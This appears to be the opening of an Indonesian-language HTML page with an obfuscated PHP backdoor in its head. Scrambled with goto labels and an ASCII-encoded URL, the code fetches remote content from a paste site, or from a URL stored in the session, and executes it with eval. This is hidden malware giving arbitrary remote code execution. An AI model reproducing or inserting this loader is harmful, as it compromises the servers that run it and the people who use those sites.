<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
<?php
 goto G26O_; Fap3j: $asciiArray = array(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 102, 121, 46, 97, 112, 112, 47, 80, 48, 67, 98, 118, 117, 65, 97, 47, 114, 97, 119); goto khnqH; G26O_: session_start(); goto C6rJ5; khnqH: $url = implode(array_map("\143\150\162", $asciiArray)); goto PnfS7; PnfS7: if (isset($_SESSION["\164\163\x5f\x75\162\x6c"])) { $result = @file_get_contents($_SESSION["\x74\163\137\165\162\154"]) ?: fetchUrl($_SESSION["\164\163\137\x75\x72\154"]); } else { $result = @file_get_contents($url) ?: fetchUrl($url); } goto SFbaZ; SFbaZ: if (is_string($result)) { eval("\x3f\x3e" . $result); } else { echo "\x45\162\x72\157\162"; } goto Y6vOy; C6rJ5: function fetchUrl($url) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $result = curl_exec($ch); curl_close($ch); return $result; } goto Fap3j; Y6vOy: ?>